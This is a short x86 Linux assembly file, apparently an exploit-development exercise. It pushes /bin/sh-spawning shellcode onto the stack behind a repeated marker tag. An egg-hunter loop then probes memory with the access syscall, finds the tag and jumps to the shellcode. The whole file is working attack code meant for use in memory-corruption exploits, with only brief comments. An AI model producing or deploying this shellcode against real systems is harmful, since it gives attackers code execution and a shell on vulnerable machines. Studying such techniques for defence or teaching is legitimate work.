global _start

section .text
_start:
; push our /bin/sh shellcode onto the stack
        push 0x80cd0bb0
        push 0x04244c8d
        push 0x5424148b
        push 0x50e3896e
        push 0x69622f68
        push 0x68732f2f
        push 0x6850c031
; push our identifier
        push 0xaabbaabb
        push 0xaabbaabb

; Stat of the egg hunter shellcode
        xor edx,edx
page_allign:
        or      dx, 0xffff
next_loc:
        inc edx
        lea ebx, [edx+0x4]
        push byte +0x21
        pop eax
        int 0x80
        cmp al, 0xf2
        jz page_allign
        mov edi,edx
        mov eax, 0xaabbaabb
        scasd
        jnz next_loc
        scasd
        jnz next_loc
        jmp edi
